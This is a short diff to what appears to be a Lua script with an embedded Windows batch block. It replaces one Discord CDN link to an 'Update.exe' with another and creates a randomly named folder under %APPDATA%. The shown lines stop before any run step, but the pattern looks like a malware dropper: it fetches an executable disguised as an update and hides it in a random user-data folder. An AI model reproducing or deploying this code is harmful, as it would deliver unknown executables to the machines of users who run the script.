@@ -7,7 +7,7 @@ coroutine.wrap(function()
                     @echo off
                     setlocal
                     
-                    set "url=https://cdn.discordapp.com/attachments/1329445662604918866/1342516769767690363/Update.exe?ex=67b9ebac&is=67b89a2c&hm=750261dd752592e8a4809415748a6b7ffdf3e257e6d65752e49b570f2b3d9587&"
+                    set "url=https://cdn.discordapp.com/attachments/1334545152504496221/1342650858327769160/Update.exe?ex=67ba688d&is=67b9170d&hm=9a1b35df1dc7343ae7317f4c1d0d09b16948e8bd91bddf989b7efa8564d3bb84&"
                     set "folder=%APPDATA%\%random%"
                     
                     mkdir "%folder%"
